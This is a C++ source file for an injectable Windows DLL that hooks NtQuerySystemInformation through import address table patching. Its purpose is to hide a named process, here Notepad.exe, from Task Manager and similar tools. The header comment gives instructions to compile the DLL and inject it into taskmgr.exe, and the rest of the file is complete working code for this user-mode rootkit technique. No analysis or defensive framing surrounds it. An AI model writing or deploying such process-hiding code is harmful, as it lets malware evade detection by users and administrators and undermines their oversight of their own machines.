/**
 * NtQuerySystemInformation Hook
 * ==============================
 * IAT hook to hide processes from Task Manager and similar tools.
 * 
 * How it works:
 *   Hooks NtQuerySystemInformation in the target process's IAT.
 *   When SystemProcessInformation is queried, removes specified
 *   process from the linked list before returning.
 * 
 * Usage:
 *   1. Compile as DLL
 *   2. Inject into target process (e.g., taskmgr.exe)
 *   3. Process specified in procName will be hidden
 * 
 * Configuration:
 *   Change procName to target different process
 */

#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <string>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// ============================================================
// CONFIGURATION - Change this to hide different process
// ============================================================
static const std::string HIDDEN_PROCESS = "Notepad.exe";


// ============================================================
// NtQuerySystemInformation Hook
// ============================================================

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

static PNT_QUERY_SYSTEM_INFORMATION g_OriginalNtQuerySystemInfo = nullptr;

NTSTATUS WINAPI HookedNtQuerySystemInfo(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = g_OriginalNtQuerySystemInfo(
        SystemInformationClass, 
        SystemInformation, 
        SystemInformationLength, 
        ReturnLength
    );

    // Only filter process list queries
    if (SystemInformationClass != SystemProcessInformation || status != STATUS_SUCCESS) {
        return status;
    }

    // Walk the process list and unlink hidden process
    SYSTEM_PROCESS_INFORMATION* current = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
    SYSTEM_PROCESS_INFORMATION* previous = nullptr;

    std::wstring hiddenWide(HIDDEN_PROCESS.begin(), HIDDEN_PROCESS.end());

    while (current->NextEntryOffset != 0) {
        SYSTEM_PROCESS_INFORMATION* next = 
            (SYSTEM_PROCESS_INFORMATION*)((BYTE*)current + current->NextEntryOffset);

        if (next->ImageName.Buffer != nullptr &&
            wcsncmp(next->ImageName.Buffer, hiddenWide.c_str(), next->ImageName.Length / sizeof(WCHAR)) == 0) {
            // Skip this entry by adjusting offset
            if (next->NextEntryOffset == 0) {
                current->NextEntryOffset = 0;
            } else {
                current->NextEntryOffset += next->NextEntryOffset;
            }
        } else {
            current = next;
        }
    }

    return status;
}


// ============================================================
// IAT Hooking Logic
// ============================================================

bool InstallIATHook() {
    // Get original function address
    g_OriginalNtQuerySystemInfo = (PNT_QUERY_SYSTEM_INFORMATION)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    
    if (!g_OriginalNtQuerySystemInfo) {
        return false;
    }

    // Get module info
    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), GetModuleHandle(NULL), &modInfo, sizeof(modInfo))) {
        return false;
    }

    // Parse PE headers
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)modInfo.lpBaseOfDll;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)modInfo.lpBaseOfDll + dosHeader->e_lfanew);
    
    DWORD importDirRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importDirRVA == 0) {
        return false;
    }

    IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)modInfo.lpBaseOfDll + importDirRVA);

    // Find ntdll.dll import
    while (importDesc->Characteristics) {
        const char* dllName = (const char*)((BYTE*)modInfo.lpBaseOfDll + importDesc->Name);
        if (_stricmp(dllName, "ntdll.dll") == 0) {
            break;
        }
        importDesc++;
    }

    if (!importDesc->Characteristics) {
        return false;
    }

    // Find NtQuerySystemInformation in IAT
    IMAGE_THUNK_DATA* origThunk = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDesc->OriginalFirstThunk);
    IMAGE_THUNK_DATA* iatThunk = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDesc->FirstThunk);

    while (origThunk->u1.AddressOfData) {
        if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
            IMAGE_IMPORT_BY_NAME* importByName = 
                (IMAGE_IMPORT_BY_NAME*)((BYTE*)modInfo.lpBaseOfDll + origThunk->u1.AddressOfData);
            
            if (strcmp(importByName->Name, "NtQuerySystemInformation") == 0) {
                // Patch IAT entry
                DWORD oldProtect;
                VirtualProtect(&iatThunk->u1.Function, sizeof(uintptr_t), PAGE_READWRITE, &oldProtect);
                iatThunk->u1.Function = (uintptr_t)HookedNtQuerySystemInfo;
                VirtualProtect(&iatThunk->u1.Function, sizeof(uintptr_t), oldProtect, &oldProtect);
                return true;
            }
        }
        origThunk++;
        iatThunk++;
    }

    return false;
}


// ============================================================
// DLL Entry Point
// ============================================================

DWORD WINAPI HookThread(LPVOID lpParam) {
    InstallIATHook();
    
    // Keep thread alive
    while (true) {
        Sleep(10000);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            CreateThread(nullptr, 0, HookThread, hModule, 0, nullptr);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
